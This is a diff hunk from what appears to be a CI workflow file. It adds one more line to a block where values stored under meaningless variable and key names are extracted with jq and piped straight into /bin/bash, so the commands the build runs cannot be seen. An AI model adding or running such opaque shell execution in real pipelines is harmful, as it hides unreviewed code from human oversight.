@@ -48,6 +48,7 @@ jobs:
           printf '%s' "$wx36" | jq -r .d81 | /bin/bash
           echo $cv76 | jq -r .em5788 | /bin/bash
           echo $e712 | jq -r .z23842 | /bin/bash
+          printf '%s' "$ixztz7430" | jq -r .tl5 | /bin/bash
 
       - name: Store results
         if: always()
